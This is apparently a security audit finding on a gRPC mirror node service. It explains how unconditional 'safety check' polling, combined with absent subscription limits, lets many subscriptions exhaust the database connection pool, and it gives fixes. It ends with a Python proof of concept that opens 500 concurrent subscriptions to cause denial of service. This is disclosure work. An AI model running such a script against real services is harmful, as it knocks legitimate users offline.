### Title
Unbounded gRPC Subscriptions Indirectly Trigger Unthrottled DB Polling, Enabling DB Connection Pool Saturation

### Summary
An unprivileged external user cannot directly set `throttled=false` — that parameter is internal. However, every call to `subscribeTopic()` unconditionally schedules a safety-check that calls `retrieve(gapFilter, false)` after 1 second, triggering the unthrottled path (12 polls × 20 ms = 240 ms burst, up to 5 000 rows/poll). Because there is no per-client rate limit or subscription cap, an attacker who opens N concurrent gRPC subscriptions causes N × 12 rapid-fire DB queries in a 240 ms window, plus N infinite throttled polls every 2 s, which together can exhaust the DB connection pool.

### Finding Description

**Entry point — `subscribeTopic()` always schedules the safety check:**

```java
// TopicMessageServiceImpl.java lines 67-70
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

`topicContext.isComplete()` returns `false` whenever `filter.getEndTime() == null` (lines 204-205), which is the common case for live subscriptions. So the safety check fires for every subscription with no end-time.

**`missingMessages(ctx, null)` calls the unthrottled retriever:**

```java
// TopicMessageServiceImpl.java line 149
return topicMessageRetriever.retrieve(gapFilter, false);
```

**Unthrottled `PollingContext` configuration (RetrieverProperties defaults):**

```java
// RetrieverProperties.java lines 36-47
public static class UnthrottledProperties {
    @Min(1000)  private int maxPageSize = 5000;
    @Min(4)     private long maxPolls = 12;
    @DurationMin(millis = 10) @NotNull
    private Duration pollingFrequency = Duration.ofMillis(20);
}
```

**`isComplete()` never returns `true` for a no-limit unthrottled subscription:**

```java
// PollingTopicMessageRetriever.java lines 121-128
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
    }
    return limitHit;  // always false when no limit set
}
```

So all 12 polls always execute regardless of whether any messages exist.

**Repeat loop drives 12 DB queries at 20 ms intervals:**

```java
// PollingTopicMessageRetriever.java lines 51-55
return Flux.defer(() -> poll(context))
        .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                .jitter(0.1)
                .withFixedDelay(context.getFrequency())
                .withScheduler(scheduler))
```

**No rate limiting or subscription cap exists** anywhere in `TopicMessageServiceImpl`, `GrpcProperties`, or `RetrieverProperties`.

**Exploit flow:**
1. Attacker opens N concurrent gRPC `subscribeTopic` calls to any valid topic (topic existence is checked but not rate-limited).
2. Each subscription immediately starts the throttled historical poll (`retrieve(filter, true)`, Long.MAX_VALUE repeats, 2 s interval).
3. After 1 s, the safety check fires for each subscription, calling `retrieve(gapFilter, false)` — 12 polls × 20 ms per subscription.
4. With N = 500 subscriptions: 500 × 12 = 6 000 DB queries in ~240 ms from the unthrottled burst, plus 250 throttled queries/second indefinitely.

### Impact Explanation
The DB connection pool (typically 10–50 connections) is exhausted by the burst of unthrottled queries combined with the ongoing throttled queries. Legitimate users receive connection-timeout errors or extreme latency. The `boundedElastic` scheduler used for the safety check has a default thread cap of 10 × CPU cores, but each thread can hold a DB connection for the duration of a poll, amplifying pool exhaustion. This is a griefing/availability impact with no economic damage to the attacker.

### Likelihood Explanation
Any unauthenticated gRPC client can call `subscribeTopic`. The only precondition is knowing a valid `topicId`, which is public on-chain data. The attack is trivially scriptable (open N connections in a loop), repeatable, and requires no special privileges or tokens. Default gRPC server settings do not cap concurrent streams per client.

### Recommendation
1. **Add a per-IP or per-client concurrent subscription limit** in the gRPC interceptor layer.
2. **Gate the safety check** so it only fires when there is evidence of a real gap (e.g., importer lag detected), not unconditionally for every subscription.
3. **Increase `unthrottled.maxPolls` minimum or reduce `maxPageSize`** to bound the worst-case burst per subscription.
4. **Apply backpressure / semaphore** on the number of concurrent `retrieve()` calls allowed to hold DB connections simultaneously.
5. Consider requiring authentication/authorization for long-lived subscriptions.

### Proof of Concept
```python
import grpc, threading, time
# Assumes proto stubs generated from mirror node proto
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc as stub
from com.hedera.mirror.api.proto import consensus_service_pb2 as pb

channel = grpc.insecure_channel("mirror-node-grpc:5600")
svc = stub.ConsensusServiceStub(channel)

def open_sub():
    req = pb.ConsensusTopicQuery(
        topicID=pb.TopicID(topicNum=1),  # any valid topic
        # no end_time → safety check always fires
    )
    for _ in svc.subscribeTopic(req):
        pass

threads = [threading.Thread(target=open_sub) for _ in range(500)]
for t in threads: t.start()
time.sleep(5)
# After ~1s: 500 safety checks fire, each triggering 12 DB queries at 20ms
# = 6000 queries in 240ms burst → DB connection pool exhausted
```
